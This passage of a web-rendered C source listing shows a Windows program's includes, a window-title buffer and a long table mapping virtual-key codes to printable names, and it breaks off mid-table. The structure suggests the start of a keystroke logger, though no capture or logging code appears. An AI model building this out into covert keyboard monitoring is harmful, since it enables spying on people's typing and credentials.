class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cTitle1[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VKeyInfo</span> &#123;</span></span><br><span class="line">	USHORT VKey;</span><br><span class="line">	LPCSTR VKname;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AddVKey(VK, VKName)   &#123;(VK), (VKName)&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> VKeyInfo vkis[] = &#123;</span><br><span class="line">		AddVKey(VK_LBUTTON, <span class="string">&quot;Left mouse button&quot;</span>),</span><br><span class="line">		AddVKey(VK_RBUTTON, <span class="string">&quot;Right mouse button&quot;</span>),</span><br><span class="line">		AddVKey(VK_CANCEL, <span class="string">&quot;Control-break processing&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x04</span>, <span class="string">&quot;Middle mouse button (three-button mouse)&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x05</span>, <span class="string">&quot;Windows 2000/XP: X1 mouse button&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x06</span>, <span class="string">&quot;Windows 2000/XP: X2 mouse button&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x07</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(VK_BACK, <span class="string">&quot; BACK&quot;</span>),</span><br><span class="line">		AddVKey(VK_TAB, <span class="string">&quot;TAB key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x0A</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x0B</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(VK_CLEAR, <span class="string">&quot;CLEAR key&quot;</span>),</span><br><span class="line">		AddVKey(VK_RETURN, <span class="string">&quot;\n&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x0E</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x0F</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(VK_SHIFT, <span class="string">&quot;SHIFT key&quot;</span>),</span><br><span class="line">		AddVKey(VK_CONTROL, <span class="string">&quot;CTRL key&quot;</span>),</span><br><span class="line">		AddVKey(VK_MENU, <span class="string">&quot;ALT key&quot;</span>),</span><br><span class="line">		AddVKey(VK_PAUSE, <span class="string">&quot;PAUSE key&quot;</span>),</span><br><span class="line">		AddVKey(VK_CAPITAL, <span class="string">&quot;CAPS LOCK key&quot;</span>),</span><br><span class="line">		AddVKey(VK_KANA, <span class="string">&quot;Input Method Editor (IME) Kana mode&quot;</span>),</span><br><span class="line">		AddVKey(VK_HANGUL, <span class="string">&quot;IME Hangul mode&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x16</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(VK_JUNJA, <span class="string">&quot;IME Junja mode&quot;</span>),</span><br><span class="line">		AddVKey(VK_FINAL, <span class="string">&quot;IME final mode&quot;</span>),</span><br><span class="line">		AddVKey(VK_HANJA, <span class="string">&quot;IME Hanja mode&quot;</span>),</span><br><span class="line">		AddVKey(VK_KANJI, <span class="string">&quot;IME Kanji mode&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x1A</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(VK_ESCAPE, <span class="string">&quot;ESC key&quot;</span>),</span><br><span class="line">		AddVKey(VK_CONVERT, <span class="string">&quot;IME convert&quot;</span>),</span><br><span class="line">		AddVKey(VK_NONCONVERT, <span class="string">&quot;IME nonconvert&quot;</span>),</span><br><span class="line">		AddVKey(VK_ACCEPT, <span class="string">&quot;IME accept&quot;</span>),</span><br><span class="line">		AddVKey(VK_MODECHANGE, <span class="string">&quot;IME mode change request&quot;</span>),</span><br><span class="line">		AddVKey(VK_SPACE, <span class="string">&quot; &quot;</span>),</span><br><span class="line">		AddVKey(VK_PRIOR, <span class="string">&quot;PAGE UP key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NEXT, <span class="string">&quot;PAGE DOWN key&quot;</span>),</span><br><span class="line">		AddVKey(VK_END, <span class="string">&quot;END key&quot;</span>),</span><br><span class="line">		AddVKey(VK_HOME, <span class="string">&quot;HOME key&quot;</span>),</span><br><span class="line">		AddVKey(VK_LEFT, <span class="string">&quot;LEFT ARROW key&quot;</span>),</span><br><span class="line">		AddVKey(VK_UP, <span class="string">&quot;UP ARROW key&quot;</span>),</span><br><span class="line">		AddVKey(VK_RIGHT, <span class="string">&quot;RIGHT ARROW key&quot;</span>),</span><br><span class="line">		AddVKey(VK_DOWN, <span class="string">&quot;DOWN ARROW key&quot;</span>),</span><br><span class="line">		AddVKey(VK_SELECT, <span class="string">&quot;SELECT key&quot;</span>),</span><br><span class="line">		AddVKey(VK_PRINT, <span class="string">&quot;PRINT key&quot;</span>),</span><br><span class="line">		AddVKey(VK_EXECUTE, <span class="string">&quot;EXECUTE key&quot;</span>),</span><br><span class="line">		AddVKey(VK_SNAPSHOT, <span class="string">&quot;PRINT SCREEN key&quot;</span>),</span><br><span class="line">		AddVKey(VK_INSERT, <span class="string">&quot;INSERT key&quot;</span>),</span><br><span class="line">		AddVKey(VK_DELETE, <span class="string">&quot;DEL key&quot;</span>),</span><br><span class="line">		AddVKey(VK_HELP, <span class="string">&quot;HELP key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x30</span>, <span class="string">&quot;0&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x31</span>, <span class="string">&quot;1&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x32</span>, <span class="string">&quot;2&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x33</span>, <span class="string">&quot;3&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x34</span>, <span class="string">&quot;4&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x35</span>, <span class="string">&quot;5&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x36</span>, <span class="string">&quot;6&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x37</span>, <span class="string">&quot;7&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x38</span>, <span class="string">&quot;8&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x39</span>, <span class="string">&quot;9&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x3A</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x3B</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x3C</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x3D</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x3E</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x3F</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x40</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x41</span>, <span class="string">&quot;A&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x42</span>, <span class="string">&quot;B&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x43</span>, <span class="string">&quot;C&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x44</span>, <span class="string">&quot;D&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x45</span>, <span class="string">&quot;E&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x46</span>, <span class="string">&quot;F&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x47</span>, <span class="string">&quot;G&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x48</span>, <span class="string">&quot;H&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x49</span>, <span class="string">&quot;I&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x4A</span>, <span class="string">&quot;J&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x4B</span>, <span class="string">&quot;K&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x4C</span>, <span class="string">&quot;L&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x4D</span>, <span class="string">&quot;M&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x4E</span>, <span class="string">&quot;N&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x4F</span>, <span class="string">&quot;O&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x50</span>, <span class="string">&quot;P&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x51</span>, <span class="string">&quot;Q&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x52</span>, <span class="string">&quot;R&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x53</span>, <span class="string">&quot;S&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x54</span>, <span class="string">&quot;T&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x55</span>, <span class="string">&quot;U&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x56</span>, <span class="string">&quot;V&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x57</span>, <span class="string">&quot;W&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x58</span>, <span class="string">&quot;X&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x59</span>, <span class="string">&quot;Y&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x5A</span>, <span class="string">&quot;Z&quot;</span>),</span><br><span class="line"></span><br><span class="line">		AddVKey(VK_LWIN, <span class="string">&quot;Left Windows key (Microsoft Natural keyboard)&quot;</span>),</span><br><span class="line">		AddVKey(VK_RWIN, <span class="string">&quot;Right Windows key (Natural keyboard)&quot;</span>),</span><br><span class="line">		AddVKey(VK_APPS, <span class="string">&quot;Applications key (Natural keyboard)&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x5E</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(VK_SLEEP, <span class="string">&quot;Computer Sleep key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD0, <span class="string">&quot;Numeric keypad 0 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD1, <span class="string">&quot;Numeric keypad 1 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD2, <span class="string">&quot;Numeric keypad 2 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD3, <span class="string">&quot;Numeric keypad 3 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD4, <span class="string">&quot;Numeric keypad 4 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD5, <span class="string">&quot;Numeric keypad 5 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD6, <span class="string">&quot;Numeric keypad 6 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD7, <span class="string">&quot;Numeric keypad 7 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD8, <span class="string">&quot;Numeric keypad 8 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMPAD9, <span class="string">&quot;Numeric keypad 9 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_MULTIPLY, <span class="string">&quot;Multiply key&quot;</span>),</span><br><span class="line">		AddVKey(VK_ADD, <span class="string">&quot;Add key&quot;</span>),</span><br><span class="line">		AddVKey(VK_SEPARATOR, <span class="string">&quot;Separator key&quot;</span>),</span><br><span class="line">		AddVKey(VK_SUBTRACT, <span class="string">&quot;Subtract key&quot;</span>),</span><br><span class="line">		AddVKey(VK_DECIMAL, <span class="string">&quot;Decimal key&quot;</span>),</span><br><span class="line">		AddVKey(VK_DIVIDE, <span class="string">&quot;Divide key&quot;</span>),</span><br><span class="line">		AddVKey(VK_F1, <span class="string">&quot;F1&quot;</span>),</span><br><span class="line">		AddVKey(VK_F2, <span class="string">&quot;F2&quot;</span>),</span><br><span class="line">		AddVKey(VK_F3, <span class="string">&quot;F3&quot;</span>),</span><br><span class="line">		AddVKey(VK_F4, <span class="string">&quot;F4&quot;</span>),</span><br><span class="line">		AddVKey(VK_F5, <span class="string">&quot;F5&quot;</span>),</span><br><span class="line">		AddVKey(VK_F6, <span class="string">&quot;F6&quot;</span>),</span><br><span class="line">		AddVKey(VK_F7, <span class="string">&quot;F7&quot;</span>),</span><br><span class="line">		AddVKey(VK_F8, <span class="string">&quot;F8&quot;</span>),</span><br><span class="line">		AddVKey(VK_F9, <span class="string">&quot;F9&quot;</span>),</span><br><span class="line">		AddVKey(VK_F10, <span class="string">&quot;F10&quot;</span>),</span><br><span class="line">		AddVKey(VK_F11, <span class="string">&quot;F11&quot;</span>),</span><br><span class="line">		AddVKey(VK_F12, <span class="string">&quot;F12&quot;</span>),</span><br><span class="line">		AddVKey(VK_F13, <span class="string">&quot;F13&quot;</span>),</span><br><span class="line">		AddVKey(VK_F14, <span class="string">&quot;F14&quot;</span>),</span><br><span class="line">		AddVKey(VK_F15, <span class="string">&quot;F15&quot;</span>),</span><br><span class="line">		AddVKey(VK_F16, <span class="string">&quot;F16&quot;</span>),</span><br><span class="line">		AddVKey(VK_F17, <span class="string">&quot;F17&quot;</span>),</span><br><span class="line">		AddVKey(VK_F18, <span class="string">&quot;F18&quot;</span>),</span><br><span class="line">		AddVKey(VK_F19, <span class="string">&quot;F19&quot;</span>),</span><br><span class="line">		AddVKey(VK_F20, <span class="string">&quot;F20&quot;</span>),</span><br><span class="line">		AddVKey(VK_F21, <span class="string">&quot;F21&quot;</span>),</span><br><span class="line">		AddVKey(VK_F22, <span class="string">&quot;F22&quot;</span>),</span><br><span class="line">		AddVKey(VK_F23, <span class="string">&quot;F23&quot;</span>),</span><br><span class="line">		AddVKey(VK_F24, <span class="string">&quot;F24&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x88</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x89</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x8A</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x8B</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x8C</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x8D</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x8E</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x8F</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(VK_NUMLOCK, <span class="string">&quot;NUM LOCK key&quot;</span>),</span><br><span class="line">		AddVKey(VK_SCROLL, <span class="string">&quot;SCROLL LOCK key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x92</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x93</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x94</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x95</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x96</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x97</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x98</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x99</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x9A</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x9B</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x9C</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x9D</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x9E</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0x9F</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(VK_LSHIFT, <span class="string">&quot;Left SHIFT key&quot;</span>),</span><br><span class="line">		AddVKey(VK_RSHIFT, <span class="string">&quot;Right SHIFT key&quot;</span>),</span><br><span class="line">		AddVKey(VK_LCONTROL, <span class="string">&quot;Left CONTROL key&quot;</span>),</span><br><span class="line">		AddVKey(VK_RCONTROL, <span class="string">&quot;Right CONTROL key&quot;</span>),</span><br><span class="line">		AddVKey(VK_LMENU, <span class="string">&quot;Left MENU key&quot;</span>),</span><br><span class="line">		AddVKey(VK_RMENU, <span class="string">&quot;Right MENU key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xA6</span>, <span class="string">&quot;Windows 2000/XP: Browser Back key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xA7</span>, <span class="string">&quot;Windows 2000/XP: Browser Forward key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xA8</span>, <span class="string">&quot;Windows 2000/XP: Browser Refresh key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xA9</span>, <span class="string">&quot;Windows 2000/XP: Browser Stop key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xAA</span>, <span class="string">&quot;Windows 2000/XP: Browser Search key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xAB</span>, <span class="string">&quot;Windows 2000/XP: Browser Favorites key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xAC</span>, <span class="string">&quot;Windows 2000/XP: Browser Start and Home key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xAD</span>, <span class="string">&quot;Windows 2000/XP: Volume Mute key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xAE</span>, <span class="string">&quot;Windows 2000/XP: Volume Down key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xAF</span>, <span class="string">&quot;Windows 2000/XP: Volume Up key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB0</span>, <span class="string">&quot;Windows 2000/XP: Next Track key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB1</span>, <span class="string">&quot;Windows 2000/XP: Previous Track key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB2</span>, <span class="string">&quot;Windows 2000/XP: Stop Media key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB3</span>, <span class="string">&quot;Windows 2000/XP: Play/Pause Media key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB4</span>, <span class="string">&quot;Windows 2000/XP: Start Mail key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB5</span>, <span class="string">&quot;Windows 2000/XP: Select Media key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB6</span>, <span class="string">&quot;Windows 2000/XP: Start Application 1 key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB7</span>, <span class="string">&quot;Windows 2000/XP: Start Application 2 key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB8</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xB9</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_1, <span class="string">&quot;;or:&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_PLUS, <span class="string">&quot;+&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_COMMA, <span class="string">&quot;,&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_MINUS, <span class="string">&quot;-&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_PERIOD, <span class="string">&quot;.or&gt;&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_2, <span class="string">&quot;/or?&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_3, <span class="string">&quot;`or~&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xC1</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xC2</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xC3</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xC4</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xC5</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xC6</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xC7</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xC8</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xC9</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xCA</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xCB</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xCC</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xCD</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xCE</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xCF</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD0</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD1</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD2</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD3</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD4</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD5</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD6</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD7</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD8</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xD9</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xDA</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_4, <span class="string">&quot;[or&#123;&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_5, <span class="string">&quot;\\or|&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_6, <span class="string">&quot;]&#125;&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_7, <span 